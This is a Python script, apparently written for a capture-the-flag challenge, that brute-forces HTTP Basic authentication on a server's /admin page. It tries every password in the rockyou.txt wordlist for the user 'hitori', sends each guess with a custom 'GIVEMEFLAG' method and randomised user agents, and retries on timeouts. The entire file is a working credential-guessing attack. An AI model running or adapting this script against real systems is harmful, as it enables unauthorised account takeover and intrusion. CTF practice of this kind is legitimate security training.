from base64 import b64encode
import time
import requests
from requests.exceptions import ReadTimeout, ConnectTimeout
from fake_useragent import UserAgent

login_url = 'http://140.115.59.7:12002/admin'

ua = UserAgent()

login_headers = {
    "Host": "140.115.59.7:12002",
    "Cache-Control": "max-age=0",
    "Authorization": None,
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": ua.random,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://140.115.59.7:12002/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,ja;q=0.6,zh-CN;q=0.5,yo;q=0.4",
    "Connection": "close"
}


def set_login(username, password):
    authorization = b64encode(f"{username}:{password}".encode('utf-8')).decode('ascii')
    login_headers["Authorization"] = f"Basic {authorization}"

count = 0
with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
    for line in rockyou:
        count += 1
        line = line.strip()
        print(f"try {count} password: {line}")
        set_login("hitori", line)
        while True:
            try:
                response = requests.request(
                    "GIVEMEFLAG", 
                    login_url, 
                    headers=login_headers, 
                    timeout=1
                )
                break
            except ReadTimeout:
                print("read timeout, retry")
            except ConnectTimeout:
                print("connect timeout, retry")
        if 'You have not been verified' not in response.text:
            print(f"found password!: {line}")
            break
        # time.sleep(0.5)



# headers['Authorization'] = basic_auth('bocchi', 'bocchio')
# response = requests.get(url='http://ctf.adl.tw:12002/admin', headers=headers)
# print(response.text)